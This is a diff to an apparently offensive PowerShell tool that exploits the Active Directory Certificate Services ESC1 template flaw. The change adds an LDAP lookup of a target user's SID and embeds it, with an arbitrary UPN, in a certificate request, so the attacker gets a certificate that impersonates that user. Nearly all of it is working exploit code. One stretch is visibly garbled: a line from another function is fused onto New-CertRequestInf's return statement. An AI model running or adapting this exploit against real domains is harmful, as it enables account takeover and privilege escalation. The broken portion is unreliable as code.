@@ -297,13 +297,65 @@ function Get-ADCSConfig {
         CAs = $cas
         Templates = $templates
         ExploitableTemplates = @($exploitable)
+        LdapServer = $effectiveLdapServer
+        LdapCredential = $effectiveLdapCredential
     }
+}
+
+
+function Resolve-TargetUserSid {
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $true)] [string]$Identity,
+        [string]$LdapServer,
+        [System.Management.Automation.PSCredential]$LdapCredential
+    )
+
+    if ([string]::IsNullOrWhiteSpace($Identity)) {
+        throw 'Target user identity cannot be empty when resolving SID.'
+    }
+
+    $rootDsePath = if ([string]::IsNullOrWhiteSpace($LdapServer)) { 'LDAP://RootDSE' } else { "LDAP://$LdapServer/RootDSE" }
+    $rootDse = if ($LdapCredential) {
+        New-Object System.DirectoryServices.DirectoryEntry($rootDsePath, $LdapCredential.UserName, $LdapCredential.GetNetworkCredential().Password)
+    }
+    else {
+        New-Object System.DirectoryServices.DirectoryEntry($rootDsePath)
+    }
+
+    $defaultNamingContext = [string]$rootDse.defaultNamingContext
+    if (-not $defaultNamingContext) {
+        throw 'Unable to resolve defaultNamingContext from RootDSE for SID lookup.'
+    }
+
+    $escapedIdentity = $Identity.Replace('\', '\5c').Replace('*', '\2a').Replace('(', '\28').Replace(')', '\29')
+    if ($escapedIdentity -like '*@*') {
+        $filter = "(&(objectClass=user)(userPrincipalName=$escapedIdentity))"
+    }
+    else {
+        $filter = "(&(objectClass=user)(|(sAMAccountName=$escapedIdentity)(cn=$escapedIdentity)))"
+    }
+
+    $searcher = Get-LdapSearcher -BaseDn $defaultNamingContext -Filter $filter -Properties @('objectSid', 'distinguishedName', 'userPrincipalName', 'sAMAccountName') -Server $LdapServer -Credential $LdapCredential
+    $result = $searcher.FindOne()
+    if (-not $result) {
+        throw "Could not resolve a unique AD user object for '$Identity'."
+    }
+
+    $sidBytes = if ($result.Properties['objectsid'].Count) { [byte[]]$result.Properties['objectsid'][0] } else { $null }
+    $sid = Convert-ObjectSidToString -SidBytes $sidBytes
+    if (-not $sid) {
+        throw "Resolved user '$Identity' but objectSid was missing."
+    }
+
+    return $sid
 }
 
 function New-CertRequestInf {
     param(
         [Parameter(Mandatory = $true)] [string]$TemplateName,
-        [Parameter(Mandatory = $true)] [string]$TargetSan
+        [Parameter(Mandatory = $true)] [string]$TargetSan,
+        [string]$TargetSid
     )
 
     $infTemplate = @'
@@ -329,12 +381,15 @@ KeyUsage = 0xa0
 [Extensions]
 2.5.29.17 = "{{text}}"
 _continue_ = "upn={1}"
+{3}
 
 [RequestAttributes]
 CertificateTemplate = {0}
 '@
 
-    return ($infTemplate -f $TemplateName, $TargetSan)
+    $sidLine = if ([string]::IsNullOrWhiteSpace($TargetSid)) { '' } else { '_continue_ = "URL=tag:microsoft.com,2022-09-14:sid:{2}"' }
+
+    return ($infTemplate -f $TemplateName, $TargetSan, $TargetSid, $sidLine)$targetSidValue = Resolve-TargetUserSid -Identity $targetSanValue -LdapServer $Config.LdapServer -LdapCredential $Config.LdapCredential
 }
 
 function Invoke-ESC1Exploitation {
@@ -362,10 +417,12 @@ function Invoke-ESC1Exploitation {
     }
 
     $targetSanValue = $TargetUserSAN
-
+    $targetSidValue = Resolve-TargetUserSid -Identity $targetSanValue -LdapServer $Config.LdapServer -LdapCredential $Config.LdapCredential
+    
     Write-Info "Using template: $($template.Name)"
     Write-Info "Using CA: $selectedCa"
     Write-Info "Target SAN/UPN: $targetSanValue"
+    Write-Info "Resolved target SID: $targetSidValue"
 
        if (-not (Get-Command certreq.exe -ErrorAction SilentlyContinue)) {
         throw 'certreq.exe was not found in PATH. This script must be run on Windows with Certificate Services tools available.'
@@ -382,7 +439,7 @@ function Invoke-ESC1Exploitation {
     $cerPath = Join-Path $env:TEMP "$($template.Name)-$tempTag.cer"
 
     try {
-        $inf = New-CertRequestInf -TemplateName $template.Name -TargetSan $targetSanValue
+        $inf = New-CertRequestInf -TemplateName $template.Name -TargetSan $targetSanValue -TargetSid $targetSidValue
         $inf | Out-File -FilePath $infPath -Encoding ASCII
         Write-Good "Request INF created: $infPath"
 
